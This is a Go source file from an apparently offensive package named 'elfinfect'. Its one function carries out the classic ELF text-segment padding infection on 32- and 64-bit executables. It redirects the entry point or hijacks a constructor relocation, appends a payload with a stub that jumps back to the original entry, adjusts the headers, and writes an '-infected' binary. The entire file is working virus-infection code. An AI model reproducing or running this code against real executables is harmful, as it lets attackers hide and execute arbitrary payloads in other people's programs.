package elfinfect

import (
	"bytes"
	"debug/elf"
	"encoding/binary"
	"errors"
	"fmt"
	"io/ioutil"
)

const (
	PAGE_SIZE                       int    = 0x1000
	MOD_ENTRY_POINT                 string = "[+] Modified entry point from 0x%x -> 0x%x\n"
	TEXT_SEG_START                  string = "[+] Text segment starts @ 0x%x\n"
	TEXT_SEG_END                    string = "[+] Text segment ends @ 0x%x\n"
	PAYLOAD_LEN_PRE_EPILOGUE        string = "[+] Payload size pre-epilogue 0x%x\n"
	PAYLOAD_LEN_POST_EPILOGUE       string = "[+] Payload size post-epilogue 0x%x\n"
	GENERATE_AND_APPEND_PIC_STUB    string = "[+] Generated and appended position independent return 2 OEP stub to payload"
	INCREASED_TEXT_SEG_P_FILESZ     string = "[+] Increased text segment p_filesz and p_memsz by %d (length of payload)\n"
	ADJUST_SEGMENTS_AFTER_TEXT      string = "[+] Adjusting segments after text segment file offsets by 0x%x\n"
	INCREASE_PHEADER_AT_INDEX_BY    string = "Inceasing pHeader @ index %d by 0x%x\n"
	INCREASE_SECTION_HEADER_ADDRESS string = "[+] Increasing section header addresses if they come after text segment"
	UPDATE_SECTIONS_PAST_TEXT_SEG   string = "[+] (%d) Updating sections past text section @ addr 0x%x\n"
	EXTEND_SECTION_HEADER_ENTRY     string = "[+] Extending section header entry for text section by payload len."
	ERROR_NO_TEXT_SEG               string = "[-] No text segment found in target binary possibly corrupted\n"
)

func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts) error {
	var textSegEnd interface{}
	var oShoff interface{}

	textNdx := t.impNdx.textNdx

	if textNdx == 0 {
		return errors.New(ERROR_NO_TEXT_SEG)
	}

	switch t.EIdent.Arch {
	case elf.ELFCLASS64:
		oEntry := t.Hdr.(*elf.Header64).Entry
		oShoff = t.Hdr.(*elf.Header64).Shoff

		t.Hdr.(*elf.Header64).Shoff += uint64(PAGE_SIZE)
		pHeaders := t.Phdrs.([]elf.Prog64)

		newEntry := pHeaders[textNdx].Vaddr + pHeaders[textNdx].Filesz

		var origAddend int64
		var relocEntry elf.Rela64

		if (opts & CtorsHijack) == CtorsHijack {
			if err := t.relativeRelocHook(&origAddend, &relocEntry, int64(newEntry)); err != nil {
				return err
			}

		} else {
			t.Hdr.(*elf.Header64).Entry = newEntry
		}

		t.printDebugMsg(MOD_ENTRY_POINT, oEntry, t.Hdr.(*elf.Header64).Entry)

		textSegEnd = pHeaders[textNdx].Off + pHeaders[textNdx].Filesz

		t.printDebugMsg(TEXT_SEG_START, pHeaders[textNdx].Off)
		t.printDebugMsg(TEXT_SEG_END, textSegEnd.(uint64))
		t.printDebugMsg(PAYLOAD_LEN_PRE_EPILOGUE, t.Payload.Len())

		if !((opts & NoRest) == NoRest) {
			t.Payload.Write(restoration64)
		}

		if !((opts & NoRetOEP) == NoRetOEP) {
			var retStub []byte
			if (opts & CtorsHijack) == CtorsHijack {
				retStub = modEpilogue(int32(t.Payload.Len()+5), uint64(relocEntry.Addend), uint64(origAddend))
			} else {
				retStub = modEpilogue(int32(t.Payload.Len()+5), t.Hdr.(*elf.Header64).Entry, oEntry)
			}
			t.Payload.Write(retStub)
		}

		t.printDebugMsg(PAYLOAD_LEN_POST_EPILOGUE, t.Payload.Len())
		if t.Debug {
			printPayload(t.Payload.Bytes())
		}

		t.Phdrs.([]elf.Prog64)[textNdx].Memsz += uint64(t.Payload.Len())
		t.Phdrs.([]elf.Prog64)[textNdx].Filesz += uint64(t.Payload.Len())

		t.printDebugMsg(GENERATE_AND_APPEND_PIC_STUB)
		t.printDebugMsg(INCREASED_TEXT_SEG_P_FILESZ, t.Payload.Len())
		t.printDebugMsg(ADJUST_SEGMENTS_AFTER_TEXT, PAGE_SIZE)

		for j := textNdx; j < len(pHeaders); j++ {
			if pHeaders[textNdx].Off < pHeaders[j].Off {
				t.printDebugMsg(INCREASE_PHEADER_AT_INDEX_BY, j, PAGE_SIZE)
				t.Phdrs.([]elf.Prog64)[j].Off += uint64(PAGE_SIZE)
			}
		}

		t.printDebugMsg(INCREASE_SECTION_HEADER_ADDRESS)

		sectionHdrTable := t.Shdrs.([]elf.Section64)
		sNum := int(t.Hdr.(*elf.Header64).Shnum)

		for k := 0; k < sNum; k++ {
			if sectionHdrTable[k].Off >= textSegEnd.(uint64) {
				t.printDebugMsg(UPDATE_SECTIONS_PAST_TEXT_SEG, k, sectionHdrTable[k].Addr)
				t.Shdrs.([]elf.Section64)[k].Off += uint64(PAGE_SIZE)
			} else if (sectionHdrTable[k].Size + sectionHdrTable[k].Addr) == t.Hdr.(*elf.Header64).Entry {
				t.printDebugMsg(EXTEND_SECTION_HEADER_ENTRY)
				t.Shdrs.([]elf.Section64)[k].Size += uint64(t.Payload.Len())
			}
		}

	case elf.ELFCLASS32:
		oEntry := t.Hdr.(*elf.Header32).Entry
		oShoff = t.Hdr.(*elf.Header32).Shoff

		t.Hdr.(*elf.Header32).Shoff += uint32(PAGE_SIZE)
		pHeaders := t.Phdrs.([]elf.Prog32)

		newEntry := pHeaders[textNdx].Vaddr + pHeaders[textNdx].Filesz

		var origAddend uint32
		var relocEntry elf.Rel32

		if (opts & CtorsHijack) == CtorsHijack {
			if err := t.relativeRelocHook(&origAddend, &relocEntry, int32(newEntry)); err != nil {
				return err
			}

		} else {
			t.Hdr.(*elf.Header32).Entry = newEntry
		}

		t.printDebugMsg(MOD_ENTRY_POINT, oEntry, t.Hdr.(*elf.Header32).Entry)

		textSegEnd = pHeaders[textNdx].Off + pHeaders[textNdx].Filesz

		t.printDebugMsg(TEXT_SEG_START, pHeaders[textNdx].Off)
		t.printDebugMsg(TEXT_SEG_END, textSegEnd.(uint32))
		t.printDebugMsg(PAYLOAD_LEN_PRE_EPILOGUE, t.Payload.Len())

		if !((opts & NoRest) == NoRest) {
			t.Payload.Write(restoration32)
		}

		if !((opts & NoRetOEP) == NoRetOEP) {
			var retStub []byte
			if (opts & CtorsHijack) == CtorsHijack {
				pEntry := pHeaders[textNdx].Vaddr + pHeaders[textNdx].Filesz
				retStub = modEpilogue(int32(t.Payload.Len()+5), pEntry, uint32(origAddend))
			} else {
				retStub = modEpilogue(int32(t.Payload.Len()+5), t.Hdr.(*elf.Header32).Entry, oEntry)
			}
			t.Payload.Write(retStub)
		}

		t.printDebugMsg(PAYLOAD_LEN_POST_EPILOGUE, t.Payload.Len())
		if t.Debug {
			printPayload(t.Payload.Bytes())
		}

		t.Phdrs.([]elf.Prog32)[textNdx].Memsz += uint32(t.Payload.Len())
		t.Phdrs.([]elf.Prog32)[textNdx].Filesz += uint32(t.Payload.Len())

		t.printDebugMsg(GENERATE_AND_APPEND_PIC_STUB)
		t.printDebugMsg(INCREASED_TEXT_SEG_P_FILESZ, t.Payload.Len())
		t.printDebugMsg(ADJUST_SEGMENTS_AFTER_TEXT, PAGE_SIZE)

		for j := textNdx; j < len(pHeaders); j++ {
			if pHeaders[textNdx].Off < pHeaders[j].Off {
				t.printDebugMsg(INCREASE_PHEADER_AT_INDEX_BY, j, PAGE_SIZE)
				t.Phdrs.([]elf.Prog32)[j].Off += uint32(PAGE_SIZE)
			}
		}

		t.printDebugMsg(INCREASE_SECTION_HEADER_ADDRESS)

		sectionHdrTable := t.Shdrs.([]elf.Section32)
		sNum := int(t.Hdr.(*elf.Header32).Shnum)

		for k := 0; k < sNum; k++ {
			if sectionHdrTable[k].Off >= textSegEnd.(uint32) {
				t.printDebugMsg(UPDATE_SECTIONS_PAST_TEXT_SEG, k, sectionHdrTable[k].Addr)
				t.Shdrs.([]elf.Section32)[k].Off += uint32(PAGE_SIZE)
			} else if (sectionHdrTable[k].Size + sectionHdrTable[k].Addr) == t.Hdr.(*elf.Header32).Entry {
				t.printDebugMsg(EXTEND_SECTION_HEADER_ENTRY)
				t.Shdrs.([]elf.Section32)[k].Size += uint32(t.Payload.Len())
			}
		}
	}

	infected := new(bytes.Buffer)

	if h, ok := t.Hdr.(*elf.Header64); ok {
		if err := binary.Write(infected, t.EIdent.Endianness, h); err != nil {
			return err
		}
	}

	if h, ok := t.Hdr.(*elf.Header32); ok {
		if err := binary.Write(infected, t.EIdent.Endianness, h); err != nil {
			return err
		}
	}

	if p, ok := t.Phdrs.([]elf.Prog64); ok {
		if err := binary.Write(infected, t.EIdent.Endianness, p); err != nil {
			return err
		}
	}

	if p, ok := t.Phdrs.([]elf.Prog32); ok {
		if err := binary.Write(infected, t.EIdent.Endianness, p); err != nil {
			return err
		}
	}

	var ephdrsz int
	switch t.EIdent.Arch {
	case elf.ELFCLASS64:
		ephdrsz = int(t.Hdr.(*elf.Header64).Ehsize) + int(t.Hdr.(*elf.Header64).Phentsize*t.Hdr.(*elf.Header64).Phnum)
	case elf.ELFCLASS32:
		ephdrsz = int(t.Hdr.(*elf.Header32).Ehsize) + int(t.Hdr.(*elf.Header32).Phentsize*t.Hdr.(*elf.Header32).Phnum)
	}

	infected.Write(t.Contents[ephdrsz:])

	infectedShdrTable := new(bytes.Buffer)
	switch t.EIdent.Arch {
	case elf.ELFCLASS64:
		binary.Write(infectedShdrTable, t.EIdent.Endianness, t.Shdrs.([]elf.Section64))
	case elf.ELFCLASS32:
		binary.Write(infectedShdrTable, t.EIdent.Endianness, t.Shdrs.([]elf.Section32))
	}

	finalInfectionTwo := make([]byte, infected.Len()+int(PAGE_SIZE))
	finalInfection := infected.Bytes()

	var endOfInfection int
	switch t.EIdent.Arch {
	case elf.ELFCLASS64:
		copy(finalInfection[int(oShoff.(uint64)):], infectedShdrTable.Bytes())
		endOfInfection = int(textSegEnd.(uint64))
	case elf.ELFCLASS32:
		copy(finalInfection[int(oShoff.(uint32)):], infectedShdrTable.Bytes())
		endOfInfection = int(textSegEnd.(uint32))
	}

	copy(finalInfectionTwo, finalInfection[:endOfInfection])

	t.printDebugMsg("[+] writing payload into the binary")

	copy(finalInfectionTwo[endOfInfection:], t.Payload.Bytes())
	copy(finalInfectionTwo[endOfInfection+PAGE_SIZE:], finalInfection[endOfInfection:])
	infectedFileName := fmt.Sprintf("%s-infected", t.Fh.Name())

	if err := ioutil.WriteFile(infectedFileName, finalInfectionTwo, 0751); err != nil {
		return err
	}

	return nil
}
